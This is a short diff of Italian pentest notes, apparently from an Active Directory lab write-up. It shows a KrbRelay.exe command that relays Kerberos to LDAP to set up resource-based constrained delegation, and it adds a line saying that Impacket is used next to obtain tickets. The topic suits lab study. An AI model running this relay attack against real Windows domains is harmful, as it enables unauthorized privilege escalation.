@@ -470,4 +470,4 @@ Lanciamo KrbRelay.exe
 .\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -rbcd S-1-5-21-585350295-1285882793-2068218167-5103 -port 443
 ```
 ![[Pasted image 20230906150422.png]]
-
+Ora usiamo Impacket per ottenere un TGT e poi un ST
